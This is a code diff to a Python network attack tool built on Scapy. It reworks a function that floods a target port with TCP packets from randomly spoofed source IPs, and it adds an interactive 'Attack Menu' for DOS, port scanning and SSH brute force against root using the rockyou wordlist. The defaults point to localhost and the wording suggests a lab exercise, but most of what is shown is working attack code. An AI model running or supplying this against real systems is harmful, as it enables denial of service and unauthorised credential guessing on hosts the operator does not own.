@@ -9,14 +9,14 @@ def dosAttack(targetIP, targetPort):
     print(f"Starting test against {targetIP}:{targetPort}...")
     interface="eth0"
 
-    while True:
+    for i in range(1, 100):
         src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
         #src_ip = "4.4.4.4"
     
         # We use / to stack layers in Scapy
         sport=random.randint(1024,65535)
         packet = IP(src=src_ip, dst=targetIP) / TCP(dport=targetPort, sport=sport)
-        print(f"packet sent at: {src_ip}:{sport}...")
+        print(f"packet sent from \t{src_ip}:{sport}\t at {targetIP}:{targetPort} ...")
         
         send(packet,iface=interface ,verbose=0)
 
@@ -71,25 +71,46 @@ def portScanner(targetIP,targetPort):
 
 
 def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--targetIP", default="127.0.0.1")
-    parser.add_argument("--targetPort", type=int, default=22) 
-    parser.add_argument("--ports",type=int,default=100)
-    parser.add_argument("--attackType", type=str, default="BruteForce")
-    parser.add_argument("--user", type=str, default="root")
-    parser.add_argument("--wordlist", type=str, default="rockyou.txt")
-    args = parser.parse_args()
+    while True:
+        print("\n==== Attack Menu ====")
+        print("1. Exit")
+        print("2. DOS Attack")
+        print("3. Port Scanning")
+        print("4. Brute Force (to be verified)")
+        
+        choice = input("Enter your choice: ").strip()
 
-    if args.attackType == "DOS":
-        dosAttack(args.targetIP, args.targetPort)
-    elif args.attackType == "PortScanner":
-        print(f"Starting port scanner on {args.targetIP}")
-        for i in range(1, args.ports+1):
-            result = portScanner(args.targetIP,i)
-            if result == "Open":
-                print(f"Port {i} is {result}")
-    elif args.attackType == "BruteForce":
-        bruteForce(args.targetIP, args.targetPort, args.user, args.wordlist)
+        if choice == "1":
+            print("Exiting...")
+            break
 
-if __name__=="__main__":
+        elif choice == "2":
+            targetIP = input("Enter target IP (default 127.0.0.1): ") or "127.0.0.1"
+            targetPort = input("Enter target Port (default 22): ") or "22"
+
+            dosAttack(targetIP, int(targetPort))
+
+        elif choice == "3":
+            targetIP = input("Enter target IP (default 127.0.0.1): ") or "127.0.0.1"
+            ports = input("Enter number of ports to scan (default 100): ") or "100"
+
+            print(f"Starting port scanner on {targetIP}")
+            for i in range(1, int(ports) + 1):
+                result = portScanner(targetIP, i)
+                if result == "Open":
+                    print(f"Port {i} is {result}")
+
+        elif choice == "4":
+            targetIP = input("Enter target IP (default 127.0.0.1): ") or "127.0.0.1"
+            targetPort = input("Enter target Port (default 22): ") or "22"
+            user = input("Enter username (default root): ") or "root"
+            wordlist = input("Enter wordlist file (default rockyou.txt): ") or "rockyou.txt"
+
+            bruteForce(targetIP, int(targetPort), user, wordlist)
+
+        else:
+            print("Invalid choice. Try again.")
+
+
+if __name__ == "__main__":
     main()
